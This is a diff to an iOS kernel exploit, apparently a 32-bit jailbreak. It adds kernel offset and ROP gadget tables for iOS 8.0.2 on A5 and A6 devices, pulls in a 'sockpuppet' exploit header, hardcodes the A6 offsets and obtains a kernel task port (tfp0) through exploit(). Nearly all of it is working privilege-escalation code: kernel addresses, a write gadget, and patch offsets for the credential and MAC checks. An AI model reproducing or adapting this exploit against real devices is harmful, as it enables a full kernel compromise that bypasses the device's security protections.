@@ -17,6 +17,7 @@
 #include <IOKit/IOKitLib.h>
 
 #include "patchfinder.h"
+#include "sock_port_2_legacy/sockpuppet.h"
 
 #define NEWFILE  (O_WRONLY|O_SYNC)
 #define CONSOLE "/dev/console"
@@ -243,6 +244,50 @@ uint32_t koffsets_S5L894xX_12H321[] = {
     0x8c,       // proc_t::p_ucred
 };
 
+uint32_t koffsets_S5L894xX_802[] = { // 8.0.2 A5
+    0x2c5308,   // OSSerializer::serialize
+    0x2c73e8,   // OSSymbol::getMetaClass
+    0x1ba80,    // calend_gettime
+    0xbd318,    // _bufattr_cpx
+    0x39bce0,   // clock_ops
+    0xab724,    // _copyin
+    0xbd31a,    // BX LR
+    0xab468,    // write_gadget: str r1, [r0, #0xc] , bx lr
+    0x3e20c8,   // vm_kernel_addrperm
+    0x39111c,   // kernel_pmap
+    0xa04b8,    // flush_dcache
+    0xab4c0,    // invalidate_tlb
+    0x2aca94,   // task_for_pid
+    0x16+2,     // pid_check_addr offset
+    0x3e,       // posix_check_ret_addr offset
+    0x224,      // mac_proc_check_ret_addr offset
+    0x3e3754,   // allproc
+    0x8,        // proc_t::p_pid
+    0x8c,       // proc_t::p_ucred
+};
+
+uint32_t koffsets_S5L895xX_802[] = { // 8.0.2 A6
+    0x2ca380,   // OSSerializer::serialize
+    0x2cc4a0,   // OSSymbol::getMetaClass
+    0x1be5c,    // calend_gettime 0x1d300?
+    0xc02f4,    // _bufattr_cpx
+    0x3a1ce0,   // clock_ops
+    0xad86c,    // _copyin
+    0xc02f6,    // BX LR
+    0xad5a8,    // write_gadget: str r1, [r0, #0xc] , bx lr // search _clock_get_calendar_nanotime - 0x18
+    0x3e81f8,   // vm_kernel_addrperm
+    0x39711c,   // kernel_pmap
+    0xa1c60,    // flush_dcache
+    0xad600,    // invalidate_tlb
+    0x2b1488,   // task_for_pid
+    0x16+2,     // pid_check_addr offset
+    0x3e,       // posix_check_ret_addr offset
+    0x224,      // mac_proc_check_ret_addr offset
+    0x3e98b4,   // allproc
+    0x8,        // proc_t::p_pid
+    0x8c,       // proc_t::p_ucred
+};
+
 uint32_t koffset(enum koffsets offset){
     if (offsets == NULL) {
         return 0;
@@ -256,32 +301,7 @@ void offsets_init(void){
     
     printf("kern.version: %s\n", u.version);
     
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:44 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8950X") == 0) {
-        printf("S5L8950X: 12H321\n");
-        offsets = koffsets_S5L895xX_12H321;
-        isA6 = 1;
-    }
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:36 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8955X") == 0) {
-        printf("S5L8955X: 12H321\n");
-        offsets = koffsets_S5L895xX_12H321;
-        isA6 = 1;
-    }
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:24 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8940X") == 0) {
-        printf("S5L8940X: 12H321\n");
-        offsets = koffsets_S5L894xX_12H321;
-    }
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:26:26 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8942X") == 0) {
-        printf("S5L8942X: 12H321\n");
-        offsets = koffsets_S5L894xX_12H321;
-    }
-    
-    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:41 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8945X") == 0) {
-        printf("S5L8945X: 12H321\n");
-        offsets = koffsets_S5L894xX_12H321;
-    }
+    offsets = koffsets_S5L895xX_802;
 }
 
 void init(void){
@@ -1041,10 +1061,9 @@ int main(void){
     offsets_init();
     initialize();
     
-    uint32_t kernel_base = leak_kernel_base();
-    printf("[*] kernel_base: %x\n", kernel_base);
+    uint32_t kernel_base;
     
-    do_exploit(kernel_base);
+    tfp0 = exploit(&kernel_base);
     
     if(tfp0){
         printf("[*] got tfp0: %x\n", tfp0);
